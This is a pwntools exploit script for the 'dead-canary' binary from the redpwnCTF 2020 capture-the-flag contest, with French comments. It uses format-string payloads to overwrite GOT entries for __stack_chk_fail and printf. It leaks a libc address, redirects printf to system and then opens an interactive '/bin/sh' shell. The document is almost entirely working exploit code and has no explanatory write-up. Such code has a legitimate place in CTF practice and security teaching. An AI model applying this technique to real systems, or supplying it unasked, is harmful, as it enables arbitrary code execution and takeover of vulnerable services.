from pwn import *

elf = ELF("./dead-canary")
libc = elf.libc

if args.REMOTE:
    p = remote("2020.redpwnc.tf",31744)
elif args.GDB:
    p = gdb.debug(elf.path)
else:
    p = process(elf.path)

p.recvuntil(": ")

log.warning("stage #1 : leaks.")
log.info("__stack_chk_fail: %s" % hex(elf.got.__stack_chk_fail))

fmt = "%064x"
fmt += "%11$n" 
fmt += "%01783x"
fmt += "%12$hn"
fmt += "%13$s"
fmt += "BBBBBBBBBBB\x00"
fmt += p64(elf.got.__stack_chk_fail + 2)
fmt += p64(elf.got.__stack_chk_fail)
fmt += p64(elf.got.printf) 
fmt += "C"*(272-len(fmt))

log.info("payload size : %s" % str(len(fmt)))
log.info("payload : %s" % fmt)

p.sendline(fmt)
data =  p.recvuntil(":")

data = data.strip().split("BBBB")[0].split("0")[-1]
l_printf = u64(data.ljust(8, "\x00"))
b_libc = l_printf - libc.sym.printf
libc.address = b_libc

log.info("leak printf: %s" % hex(l_printf))
log.info("leak libc  : %s" % hex(b_libc))
log.info("leak system: %s" % hex(libc.sym.system))

log.warning("stage #2 : exploitation.")
'''
options:
1. on reecris __stack_chk_fail avec notre gadget
X. on reecris __stack_chk_fail avec 'write' et on overflow vers notre gadget
[3]. remplacer printf par system et reboucler sur le main pour envoyer "/bin/sh" au printf 0x004007dc
'''

log.info("two write to make:")

first_write = int(hex(libc.sym.system)[-2:], 16)
second_write = int(hex(libc.sym.system)[-6:-2], 16)

log.info("1. [%s] => %s (%s)" % (hex(elf.got.printf), str(first_write), hex(first_write)))
log.info("2. [%s] => %s (%s)" % (hex(elf.got.printf +1), str(second_write), hex(second_write)))

exp = "%0{}x".format(first_write) 
exp += "%10$hn"
exp += "%0{}x".format(second_write - first_write)
exp += "%11$hn"
exp += "Z"*(31 - len(exp)) + "\x00"
exp += p64(elf.got.printf)
exp += p64(elf.got.printf + 1)
exp += "B"* (276 - len(exp))
exp += "AAAA" # just overwrite the stack canary 

p.sendline(exp)
p.sendline("/bin/sh")
p.interactive()

